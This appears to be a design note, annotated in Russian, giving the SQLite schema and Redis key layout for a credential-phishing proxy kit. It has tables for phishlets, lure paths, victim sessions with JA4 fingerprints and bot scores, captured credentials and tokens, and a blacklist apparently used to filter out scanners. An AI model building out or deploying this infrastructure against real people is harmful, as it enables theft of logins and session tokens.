# DB schema v1 (frozen) — SQLite

Только метаданные. Тела кредов живут в Redis с TTL, сюда пишется только факт захвата.

```sql
CREATE TABLE IF NOT EXISTS lures (
  id TEXT PRIMARY KEY,
  phishlet_id TEXT NOT NULL,
  path TEXT NOT NULL UNIQUE,      -- /l/login01
  created_at INTEGER NOT NULL
);
CREATE TABLE IF NOT EXISTS sessions (
  id TEXT PRIMARY KEY,
  phishlet_id TEXT NOT NULL,
  ip TEXT NOT NULL,
  ja4 TEXT DEFAULT '',
  bot_score INTEGER DEFAULT 0,
  created_at INTEGER NOT NULL
);
CREATE TABLE IF NOT EXISTS captures (
  id TEXT PRIMARY KEY,
  session_id TEXT NOT NULL REFERENCES sessions(id),
  kind TEXT NOT NULL,             -- creds | token | body
  created_at INTEGER NOT NULL
);
CREATE TABLE IF NOT EXISTS blacklist (
  ip_or_ja4 TEXT PRIMARY KEY,
  reason TEXT NOT NULL
);
```

Redis keys:
- `sess:<id>` -> JSON {phishlet, ip, ja4, created} TTL 60m
- `cap:<sess>` -> list of {kind, keys-hashed} TTL 60m (без plaintext паролей в логах)
